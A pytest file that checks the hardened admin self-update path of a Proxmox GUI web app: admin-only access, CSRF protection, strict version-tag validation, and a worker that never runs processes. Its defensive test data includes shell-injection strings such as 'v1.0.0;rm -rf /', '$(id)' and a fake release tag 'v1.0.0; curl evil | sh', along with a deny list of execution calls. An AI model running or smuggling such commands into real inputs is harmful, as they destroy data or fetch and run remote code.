"""Self-update tests (DEPLOY-04; hardened in docs/hardening/UPDATER.md, F-03).

1. **202-enqueue route.** ``POST /api/v1/admin/self-update`` admin-only, CSRF-protected,
   returns 202 with a job_id; a non-admin gets 403; missing arq_pool returns 503; the
   version must be a clean ``vX.Y.Z`` tag.
2. **The worker job only talks to the root updater.** It validates the tag, writes a tiny
   request file and mirrors ``status.json``. It contains no subprocess, no sudo and no
   extraction. Download, signature/hash verification, tarball validation, backup, migration
   and rollback are the updater's job and are tested in ``deploy/tests/test_updater.sh``.
"""

from __future__ import annotations

import asyncio
import json
from pathlib import Path

import pytest

from tests.factories import login_as, make_user

# ---------------------------------------------------------------------------
# 1. 202-enqueue route
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_self_update_route_admin_enqueues_202(client, session_factory):
    """An admin POSTing the route gets 202 + a job_id; the arq pool is called."""
    await make_user(
        session_factory, username="su_admin", is_admin=True,
        password="testpass12345",
    )
    cookies = await login_as(
        client, username="su_admin", password="testpass12345"
    )
    csrf = cookies["csrf_token"]

    resp = await client.post(
        "/api/v1/admin/self-update/",
        cookies=cookies,
        headers={"X-CSRF-Token": csrf},
        json={},
    )
    assert resp.status_code == 202, resp.text
    body = resp.json()
    assert "job_id" in body
    assert isinstance(body["job_id"], int)


@pytest.mark.asyncio
async def test_self_update_route_non_admin_forbidden(client, session_factory):
    await make_user(
        session_factory, username="su_user", is_admin=False,
        password="testpass12345",
    )
    cookies = await login_as(
        client, username="su_user", password="testpass12345"
    )
    csrf = cookies["csrf_token"]

    resp = await client.post(
        "/api/v1/admin/self-update/",
        cookies=cookies,
        headers={"X-CSRF-Token": csrf},
        json={},
    )
    assert resp.status_code == 403


@pytest.mark.asyncio
async def test_self_update_route_csrf_required(client, session_factory):
    """Missing X-CSRF-Token → 403 (CSRF guard fires before route handler)."""
    await make_user(
        session_factory, username="su_csrf", is_admin=True,
        password="testpass12345",
    )
    cookies = await login_as(
        client, username="su_csrf", password="testpass12345"
    )

    resp = await client.post(
        "/api/v1/admin/self-update/", cookies=cookies, json={}
    )
    assert resp.status_code == 403


@pytest.mark.asyncio
async def test_self_update_route_503_when_arq_pool_missing(
    client, session_factory, app,
):
    """If app.state.arq_pool is None the route returns 503 (mirrors jobs_retry)."""
    await make_user(
        session_factory, username="su_arq", is_admin=True,
        password="testpass12345",
    )
    cookies = await login_as(
        client, username="su_arq", password="testpass12345"
    )
    csrf = cookies["csrf_token"]

    # Knock out the recording fake the conftest installed.
    app.state.arq_pool = None

    resp = await client.post(
        "/api/v1/admin/self-update/",
        cookies=cookies,
        headers={"X-CSRF-Token": csrf},
        json={},
    )
    assert resp.status_code == 503


@pytest.mark.asyncio
async def test_self_update_route_rejects_bad_version(client, session_factory):
    """target_version validation: anything that is not a clean tag string → 422.

    V5 input validation (Pitfall: the version string is interpolated into a
    URL the worker fetches; a stray shell metacharacter could surprise).
    """
    await make_user(
        session_factory, username="su_ver", is_admin=True,
        password="testpass12345",
    )
    cookies = await login_as(
        client, username="su_ver", password="testpass12345"
    )
    csrf = cookies["csrf_token"]

    resp = await client.post(
        "/api/v1/admin/self-update/",
        cookies=cookies,
        headers={"X-CSRF-Token": csrf},
        json={"target_version": "v1.0.0;rm -rf /"},
    )
    assert resp.status_code == 422


# ---------------------------------------------------------------------------
# 2. The worker job: request file + status mirror (no subprocess, no sudo)
# ---------------------------------------------------------------------------

APP_DIR = Path(__file__).resolve().parents[1] / "app"


@pytest.fixture()
def updater_env(tmp_path, monkeypatch):
    """Point the worker's file protocol at tmp_path and install a fake updater binary."""
    from app.config import settings
    from app.jobs import selfupdate_functions

    updater = tmp_path / "proxmox-gui-updater"
    updater.write_text("#!/bin/sh\n")
    updater.chmod(0o755)
    monkeypatch.setattr(settings, "updater_path", updater)
    monkeypatch.setattr(settings, "update_request_path", tmp_path / "update" / "request")
    monkeypatch.setattr(settings, "update_status_path", tmp_path / "run" / "status.json")
    monkeypatch.setattr(settings, "release_conf_path", tmp_path / "release.conf")
    monkeypatch.setattr(selfupdate_functions, "POLL_INTERVAL_S", 0.02)
    monkeypatch.setattr(selfupdate_functions, "POLL_TIMEOUT_S", 0.6)
    (tmp_path / "run").mkdir()
    return tmp_path


async def _seed_job(session_factory, payload: dict | None = None) -> int:
    from app.models import Job

    async with session_factory() as db:
        job = Job(
            kind="admin.self-update", cluster_id=None, team_id=None, actor_user_id=None,
            payload=json.dumps(payload if payload is not None else {}), state="pending",
            idempotency_key=None,
        )
        db.add(job)
        await db.commit()
        await db.refresh(job)
        return job.id


async def _final(session_factory, job_id: int):
    from app.models import Job

    async with session_factory() as db:
        return await db.get(Job, job_id)


def _status(tmp, **kw) -> None:
    data = {"state": "running", "step": "downloading", "target": "v0.9.0", "from": "v0.8.0",
            "message": "", "rolled_back": False, "updated_at": "2999-01-01T00:00:00Z"}
    data.update(kw)
    (tmp / "run" / "status.json").write_text(json.dumps(data))


async def _run(session_factory, job_id):
    from app.jobs.selfupdate_functions import run_self_update

    await run_self_update({"sessionmaker": session_factory, "redis": None}, job_id)


@pytest.mark.asyncio
async def test_worker_writes_only_the_tag_and_mirrors_success(session_factory, updater_env):
    job_id = await _seed_job(session_factory, {"target_version": "v0.9.0"})

    async def updater():
        req = updater_env / "update" / "request"
        for _ in range(200):
            if req.exists():
                break
            await asyncio.sleep(0.01)
        assert req.read_text() == "v0.9.0"  # nothing but the tag
        assert (req.stat().st_mode & 0o777) == 0o640
        _status(updater_env, state="running")
        await asyncio.sleep(0.05)
        _status(updater_env, state="succeeded", message="updated from v0.8.0 to v0.9.0")

    await asyncio.gather(_run(session_factory, job_id), updater())
    final = await _final(session_factory, job_id)
    assert final.state == "succeeded"
    assert "v0.9.0" in (final.friendly_error or "")


@pytest.mark.asyncio
async def test_worker_mirrors_updater_failure_and_rollback(session_factory, updater_env):
    job_id = await _seed_job(session_factory, {"target_version": "v0.9.0"})

    async def updater():
        while not (updater_env / "update" / "request").exists():  # noqa: ASYNC110 - test poller
            await asyncio.sleep(0.01)
        _status(updater_env, state="failed", message="post-update health check failed", rolled_back=True)

    await asyncio.gather(_run(session_factory, job_id), updater())
    final = await _final(session_factory, job_id)
    assert final.state == "failed"
    assert "health check" in (final.error or "")
    assert "rolled back" in (final.friendly_error or "")


@pytest.mark.asyncio
async def test_worker_treats_noop_as_success(session_factory, updater_env):
    job_id = await _seed_job(session_factory, {"target_version": "v0.9.0"})

    async def updater():
        while not (updater_env / "update" / "request").exists():  # noqa: ASYNC110 - test poller
            await asyncio.sleep(0.01)
        _status(updater_env, state="noop", message="already running v0.9.0")

    await asyncio.gather(_run(session_factory, job_id), updater())
    assert (await _final(session_factory, job_id)).state == "succeeded"


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "bad",
    [".", "..", "a b", "$(id)", "v1.0.0;id", "v1.0", "1.2.3", "master", "latest", "v1..0.0", "../v1.0.0",
     "v1.0.0\nv2.0.0", "v" + "1" * 70 + ".0.0", "v1.0.0-a..b"],
)
async def test_worker_rejects_hostile_versions_without_writing_a_request(session_factory, updater_env, bad):
    job_id = await _seed_job(session_factory, {"target_version": bad})
    await _run(session_factory, job_id)
    assert (await _final(session_factory, job_id)).state == "failed"
    assert not (updater_env / "update" / "request").exists()


@pytest.mark.asyncio
async def test_worker_fails_cleanly_when_the_updater_is_absent(session_factory, updater_env):
    (updater_env / "proxmox-gui-updater").unlink()
    job_id = await _seed_job(session_factory, {"target_version": "v0.9.0"})
    await _run(session_factory, job_id)
    final = await _final(session_factory, job_id)
    assert final.state == "failed"
    assert "updater" in (final.error or "")
    assert "install.sh --update" in (final.friendly_error or "")
    assert not (updater_env / "update" / "request").exists()


@pytest.mark.asyncio
async def test_worker_refuses_when_a_request_is_already_pending(session_factory, updater_env):
    (updater_env / "update").mkdir()
    (updater_env / "update" / "request").write_text("v0.8.1")
    job_id = await _seed_job(session_factory, {"target_version": "v0.9.0"})
    await _run(session_factory, job_id)
    assert (await _final(session_factory, job_id)).state == "failed"
    assert (updater_env / "update" / "request").read_text() == "v0.8.1"  # untouched


@pytest.mark.asyncio
async def test_worker_ignores_a_stale_status_from_an_earlier_run(session_factory, updater_env):
    """A `succeeded` for the same target written BEFORE our request must not end this job."""
    _status(updater_env, state="succeeded", updated_at="2000-01-01T00:00:00Z")
    job_id = await _seed_job(session_factory, {"target_version": "v0.9.0"})
    await _run(session_factory, job_id)  # the updater never answers
    final = await _final(session_factory, job_id)
    assert final.state == "failed"
    assert "timed out" in (final.error or "")


@pytest.mark.asyncio
@pytest.mark.parametrize("garbage", ["not json", "[]", '{"state": "exploded"}', "null", '{"state": {"x": 1}}'])
async def test_worker_survives_garbage_status_files(session_factory, updater_env, garbage):
    (updater_env / "run" / "status.json").write_text(garbage)
    job_id = await _seed_job(session_factory, {"target_version": "v0.9.0"})
    await _run(session_factory, job_id)
    assert (await _final(session_factory, job_id)).state == "failed"


@pytest.mark.asyncio
async def test_latest_is_resolved_from_the_pinned_fork_and_validated(session_factory, updater_env, monkeypatch):
    from app.selfupdate import service

    (updater_env / "release.conf").write_text("REPO_URL=https://github.com/o/r\n")
    seen = {}

    async def fake_latest(repo_url):
        seen["repo"] = repo_url
        return service.validate_tag("v0.9.0")

    monkeypatch.setattr(service, "resolve_latest_tag", fake_latest)
    job_id = await _seed_job(session_factory, {"target_version": None})

    async def updater():
        while not (updater_env / "update" / "request").exists():  # noqa: ASYNC110 - test poller
            await asyncio.sleep(0.01)
        _status(updater_env, state="succeeded", message="ok")

    await asyncio.gather(_run(session_factory, job_id), updater())
    assert seen["repo"] == "https://github.com/o/r"  # never the upstream author's repo
    assert (updater_env / "update" / "request").read_text() == "v0.9.0"
    assert (await _final(session_factory, job_id)).state == "succeeded"


@pytest.mark.asyncio
async def test_a_hostile_latest_tag_from_github_is_rejected(session_factory, updater_env, monkeypatch):
    import httpx

    (updater_env / "release.conf").write_text("REPO_URL=https://github.com/o/r\n")

    class FakeResp:
        status_code = 200

        def json(self):
            return {"tag_name": "v1.0.0; curl evil | sh"}

    class FakeClient:
        def __init__(self, *a, **k): ...
        async def __aenter__(self): return self
        async def __aexit__(self, *a): return False
        async def get(self, *a, **k): return FakeResp()

    monkeypatch.setattr(httpx, "AsyncClient", FakeClient)
    job_id = await _seed_job(session_factory, {})
    await _run(session_factory, job_id)
    assert (await _final(session_factory, job_id)).state == "failed"
    assert not (updater_env / "update" / "request").exists()


def test_release_conf_must_name_a_github_repo(tmp_path):
    from app.selfupdate.service import read_repo_url

    good = tmp_path / "a"
    good.write_text("REPO_URL=https://github.com/dakser/proxmox-gui\n")
    assert read_repo_url(good) == "https://github.com/dakser/proxmox-gui"
    for bad in ("REPO_URL=http://github.com/o/r", "REPO_URL=https://evil.example/o/r",
                "REPO_URL=https://github.com/o/r.git", "REPO_URL=https://github.com/o/r/x", "X=1", ""):
        f = tmp_path / "b"
        f.write_text(bad + "\n")
        with pytest.raises(RuntimeError):
            read_repo_url(f)


def test_worker_module_has_no_process_execution_sudo_or_extraction():
    """F-03: the unprivileged worker must never run anything or unpack anything."""
    import re

    for rel in ("jobs/selfupdate_functions.py", "selfupdate/service.py"):
        code = "\n".join(
            line for line in (APP_DIR / rel).read_text().splitlines() if not line.lstrip().startswith("#")
        )
        code = re.sub(r'""".*?"""', "", code, flags=re.S)  # docstrings may explain what is NOT done
        for forbidden in ("subprocess", "create_subprocess", "os.system", "sudo", "tarfile", "tar ", "systemctl",
                          "shutil", "update.sh", "pip install", "urlopen"):
            assert forbidden not in code, f"{rel} must not contain {forbidden!r}"


def test_updater_helpers_from_the_unsafe_design_are_gone():
    from app.selfupdate import service

    for name in ("download_tarball", "verify_sha256", "fetch_release_manifest", "snapshot_db"):
        assert not hasattr(service, name), f"{name} belonged to the removed in-worker update path"


# ---------------------------------------------------------------------------
# 3. Worker registration
# ---------------------------------------------------------------------------


def test_worker_settings_registers_the_real_run_self_update():
    from app.jobs import selfupdate_functions
    from app.jobs.worker import WorkerSettings

    matches = [f for f in WorkerSettings.functions if getattr(f, "name", "") == "admin.self-update"]
    assert matches, "admin.self-update is not registered in WorkerSettings.functions"
    assert matches[0].coroutine is selfupdate_functions.run_self_update
